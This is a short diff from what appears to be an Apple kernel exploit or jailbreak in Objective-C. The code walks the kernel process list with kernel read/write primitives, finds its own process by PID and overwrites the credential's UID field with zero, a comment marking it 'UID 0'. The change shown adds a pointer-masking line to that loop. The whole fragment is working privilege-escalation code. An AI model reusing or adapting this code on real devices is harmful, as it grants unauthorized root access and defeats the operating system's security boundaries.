@@ -90,6 +90,8 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
     pid_t my_pid = getpid();
     
     while (proc != 0 && proc != 0xDEADBEEF) {
+        proc = proc | 0xFFFFFF8000000000ULL; 
+        
         if ((pid_t)[self kread64:(proc + 0x68)] == my_pid) {
             uint64_t ucred = [self kread64:(proc + 0xD8)];
             [self kwrite64:(ucred + 0x18) value:0]; // UID 0
